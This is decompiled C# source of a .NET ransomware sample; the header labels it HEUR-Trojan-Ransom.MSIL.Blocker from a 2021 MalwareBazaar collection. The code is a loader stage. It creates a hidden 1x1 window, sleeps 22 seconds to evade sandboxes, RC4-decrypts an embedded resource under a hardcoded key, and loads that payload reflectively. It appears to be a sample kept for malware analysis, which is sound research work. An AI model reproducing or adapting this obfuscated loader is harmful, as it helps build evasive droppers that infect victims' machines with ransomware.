// Decompiled with JetBrains decompiler
// Type: Kzzdehomtdt.Catcher
// Assembly: Ring0, Version=20.31.2.5854, Culture=neutral, PublicKeyToken=null
// MVID: E3BC9DD1-F9F5-4043-B7FA-B406B3F50D7A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.07-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b48bae302c5f2114c9f4f0b497af5ac239792c1629cf5418492d10df273bfaca.exe

using Sgjnaqgvttlsgispqarhnky;
using System;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Kzzdehomtdt
{
  public class Catcher : Form
  {
    private static Catcher mInstance;
    private static TaskCompletionSource<Catcher> onLoad = new TaskCompletionSource<Catcher>();

    public static event Catcher.CopyStringDelegate StringCopied;

    public static event Catcher.CopyDataDelegate DataCopied;

    public Catcher()
    {
      this.ShowInTaskbar = false;
      this.Width = 1;
      this.Height = 1;
    }

    public static void Demo()
    {
      Thread.Sleep(22000);
      AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(Catcher.CurrentDomain_AssemblyResolve);
      Catcher.Start().Wait();
      Catcher.StringCopied += new Catcher.CopyStringDelegate(Console.WriteLine);
      Catcher.DataCopied += (Catcher.CopyDataDelegate) (msg => Console.WriteLine("Received " + msg.dwData.ToString() + ": " + msg.lpData));
      MessagePasser.SendString(Catcher.GetHandle(), "test");
      MessagePasser.SendString(Catcher.GetHandle(), 3, "other test");
      while (Catcher.IsOpen())
        Thread.Sleep(1);
    }

    private static Assembly CurrentDomain_AssemblyResolve(
      object sender,
      ResolveEventArgs args)
    {
      MemoryStream destination = new MemoryStream();
      using (Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Kzzdehomtdt.Sgjnaqgvttlsgispqarhnky.dll"))
        manifestResourceStream.CopyTo((Stream) destination);
      if (destination.Length <= 0L)
        return (Assembly) null;
      return (Assembly) typeof (Assembly).InvokeMember("Load", BindingFlags.InvokeMethod, (Binder) null, (object) null, new object[1]
      {
        (object) Catcher.Decrypt(destination.ToArray())
      });
    }

    public static Task<Catcher> Start()
    {
      ClassLibrary classLibrary = new ClassLibrary();
      Thread thread = new Thread(new ThreadStart(Catcher.runForm));
      classLibrary.Data();
      thread.SetApartmentState(ApartmentState.STA);
      thread.IsBackground = true;
      thread.Start();
      return Catcher.onLoad.Task;
    }

    internal static byte[] Decrypt(byte[] data)
    {
      int[] numArray1 = new int[256];
      int[] numArray2 = new int[256];
      byte[] numArray3 = new byte[data.Length];
      byte[] bytes = Encoding.UTF8.GetBytes("Zzdxemn");
      for (int index = 0; index < 256; ++index)
      {
        numArray1[index] = (int) bytes[index % bytes.Length];
        numArray2[index] = index;
      }
      int index1;
      for (int index2 = index1 = 0; index1 < 256; ++index1)
      {
        index2 = (index2 + numArray2[index1] + numArray1[index1]) % 256;
        int num = numArray2[index1];
        numArray2[index1] = numArray2[index2];
        numArray2[index2] = num;
      }
      int num1;
      int index3 = num1 = 0;
      int index4 = num1;
      int index5 = num1;
      for (; index3 < data.Length; ++index3)
      {
        index5 = (index5 + 1) % 256;
        index4 = (index4 + numArray2[index5]) % 256;
        int num2 = numArray2[index5];
        numArray2[index5] = numArray2[index4];
        numArray2[index4] = num2;
        int num3 = numArray2[(numArray2[index5] + numArray2[index4]) % 256];
        numArray3[index3] = (byte) ((uint) data[index3] ^ (uint) num3);
      }
      return numArray3;
    }

    protected override void OnLoad(EventArgs e)
    {
      base.OnLoad(e);
      Catcher.onLoad.SetResult(this);
    }

    public static IntPtr GetHandle()
    {
      IntPtr val = IntPtr.Zero;
      if (Catcher.mInstance == null)
        throw new InvalidOperationException("Catcher not started");
      Catcher.mInstance.Invoke((Delegate) (() => val = Catcher.mInstance.Handle));
      return val;
    }

    public static bool IsOpen()
    {
      bool val = false;
      if (Catcher.mInstance == null)
        throw new InvalidOperationException("Catcher not started");
      if (!Catcher.mInstance.IsDisposed)
      {
        if (!Catcher.mInstance.Disposing)
        {
          try
          {
            Catcher.mInstance.Invoke((Delegate) (() => val = Catcher.mInstance.Visible));
          }
          catch (Exception ex)
          {
            return false;
          }
          return val;
        }
      }
      return false;
    }

    public static void Stop()
    {
      if (Catcher.mInstance == null)
        throw new InvalidOperationException("Catcher not started");
      Catcher.DataCopied = (Catcher.CopyDataDelegate) null;
      Catcher.mInstance.Invoke((Delegate) new MethodInvoker(Catcher.mInstance.endForm));
    }

    private static void runForm()
    {
      Catcher.mInstance = new Catcher();
      Application.Run((Form) Catcher.mInstance);
    }

    private void endForm() => this.Close();

    protected override void WndProc(ref Message m)
    {
      if (m.Msg == 74)
      {
        Catcher.CopyDataDelegate dataCopied = Catcher.DataCopied;
        if (dataCopied != null)
          dataCopied(MessagePasser.ReceiveData(m));
        Catcher.CopyStringDelegate stringCopied = Catcher.StringCopied;
        if (stringCopied != null)
          stringCopied(MessagePasser.ReceiveString(m));
      }
      base.WndProc(ref m);
    }

    public delegate void CopyStringDelegate(string msg);

    public delegate void CopyDataDelegate(CopyData msg);
  }
}
